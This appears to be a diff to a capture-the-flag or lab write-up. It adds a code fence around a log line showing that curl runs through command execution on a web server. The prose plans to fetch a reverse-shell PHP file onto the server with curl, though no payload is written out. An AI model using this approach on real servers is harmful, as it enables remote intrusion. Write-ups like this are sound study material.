@@ -298,7 +298,8 @@ User www-data may run the following commands on 42905e333fcc:
            We can not run reverse shell command in cmd.
 + we can put revershell.php into the server by curl.
 + Try curl -h in cmd:
-	"10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "Usage: curl [options...] <url>
+  ```bash
+  	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "Usage: curl [options...] <url>
 	     --abstract-unix-socket <path> Connect via abstract Unix domain socket
 	     --anyauth       Pick any authentication method
 	 -a, --append        Append to target file when uploading
@@ -313,7 +314,8 @@ User www-data may run the following commands on 42905e333fcc:
 	     --compressed-ssh Enable SSH compression
 	 -K, --config <file> Read config from a file
 	     --connect-timeout <seconds> Maximum time allowed for connection
-	     --connect-to <HOST1:PORT1:HOST2:PORT2> Connect to host "
+	     --connect-to <HOST1:PORT1:HOST2:PORT2> Connect to host
+  ```
 -> It works !!!
 
 + So we run 'curl' to put the revershell.php into the server.
